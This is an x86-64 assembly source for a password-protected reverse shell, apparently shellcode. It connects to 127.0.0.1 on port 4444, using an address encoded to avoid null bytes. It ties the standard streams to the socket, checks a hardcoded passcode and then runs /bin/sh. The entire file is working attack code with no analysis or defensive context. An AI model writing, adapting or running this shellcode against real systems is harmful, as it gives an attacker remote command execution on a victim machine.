global _start
	
	jmp real_start
	passwordquery: db 'Please enter your passcode : ', 0xa

real_start:

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	xor rax, rax
	mov rdi, rax
	mov rsi, rdi
	xor rdx, rdx
	add rax, 41
	add rdi, 2
	add rsi, 1
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax
	push rax	
;	mov dword [rsp+4], 0x0100007f
	mov dword [rsp+4], 0x12111190
	sub dword [rsp+4], 0x11111111
	mov word [rsp+2], 0x5c11
	mov byte [rsp], 0x2
;	sub rsp, 8

	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	xor rax, rax
	mov rdx, rax
	add rax, 42
	mov rsi, rsp
	add rdx, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)
        
	xor rax, rax
	mov rsi, rax
	add rax, 33
        syscall

	xor rax, rax
	mov rsi, rax
        add rax, 33
        add rsi, 1
        syscall
	
	xor rax, rax
        mov rsi, rax
	add rax, 33
        add rsi, 2
        syscall

	; CHECK PASSWORD

    check:
	;just printout
        xor rax, rax
        mov rdx, rax
        add rax, 1
        mov rdi, rax
        lea rsi, [rel passwordquery]
        add rdx, 30
        syscall


	xor rax, rax
        mov rdi, rax
        mov rdx, rax
        mov rsi, rsp
        add rdx, 8
	syscall

	mov rax, 0x31307461506c314e
	mov rdi, rsi        ; point RDI to data from client
	scasq               ; compare RAX and [RDI]
	jne check	



        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall

